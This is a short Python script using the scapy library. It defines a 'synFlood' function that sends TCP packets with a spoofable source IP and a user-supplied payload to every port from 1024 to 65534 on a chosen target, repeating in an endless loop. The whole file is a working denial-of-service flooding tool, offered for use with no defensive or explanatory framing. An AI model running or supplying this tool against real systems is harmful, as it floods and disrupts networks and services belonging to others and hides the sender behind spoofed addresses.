#!/user/bin/python

# Requires WinPCap

from scapy.all import *

def synFlood(src,tgt,message):
    for dport in range(1024,65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=4444, dport=dport)
        Rawlayer= Raw(load=message)
        pkt = IPlayer/TCPlayer/Rawlayer
        send(pkt)

source = input("[*] Enter source IP addrress: ")
target = input("[*] Enter target IP addrress: ")
message = input("[*] Enter payload message: ")

while True:
    synFlood(source, target, message)